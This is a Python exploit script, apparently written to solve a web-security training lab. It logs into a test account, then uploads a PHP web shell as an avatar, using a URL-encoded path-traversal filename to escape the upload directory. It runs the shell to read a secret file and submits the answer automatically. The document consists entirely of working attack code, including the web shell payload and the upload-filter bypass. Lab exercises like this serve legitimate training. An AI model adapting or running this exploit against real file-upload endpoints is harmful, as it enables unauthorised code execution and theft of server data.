import requests
import sys
import urllib3
from colorama import init, Fore
from bs4 import BeautifulSoup
import random, string
from requests_toolbelt import MultipartEncoder

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

def csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {"name": "csrf"})['value']
    return csrf
    
def Web_shell_upload_via_path_traversal(s, url):
    path = '/login'
    uri = url + path
    csrf = csrf_token(s, uri)
    r = s.post(uri, data={'csrf':csrf, 'username': 'wiener', 'password': 'peter'}, verify=False, proxies=proxies)
    if r.status_code == 200 and 'Log out' in r.text:
        print(Fore.GREEN + '[+] Successfuly Login to weiner account')
        print(Fore.YELLOW + '[+] Uploading web shell')
        account_url = url + "/my-account"
        upload_url = url + "/my-account/avatar"
        csrf = csrf_token(s, account_url)
        file = {"avatar": ('%2e%2e%2fweb-shell.php', "<?php echo file_get_contents('/home/carlos/secret'); ?>", 'image/png'), "user": "wiener", "csrf": csrf}   
        boundary = '------WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))
        files = MultipartEncoder(fields=file, boundary=boundary)
        headers = {'Content-Type': files.content_type}     
        s.post(upload_url, headers=headers, data=files, verify=False, proxies=proxies)
        r = s.get(url + '/files/web-shell.php', verify=False, proxies=proxies)
        if r.status_code == 200:
            print(Fore.GREEN + f'[+] Answer is {r.text}')
            r = s.post(url + '/submitSolution',data={'answer':r.text}, verify=False, proxies=proxies)
            print(Fore.GREEN + '[+] Congratulations, you solved the lab!')
            with open("output.txt", "w") as file:
                file.write("Success")
            return True
        else:
            print(Fore.RED +'[-] Unable to get the answer') 
            return False
    else:
        print(Fore.RED +'[-] Unable login to Wiener account')
        return False
        
def main():
    try:
        if len(sys.argv) != 2:
            print(Fore.YELLOW + "[!] Usage: %s <url>" % sys.argv[0])
            return
    except IndexError as e:
        print(Fore.RED + f'[-] Error {e}')
        return
    
    s = requests.Session()
    url = sys.argv[1]
    Web_shell_upload_via_path_traversal(s, url)

if __name__ == "__main__":
    main()
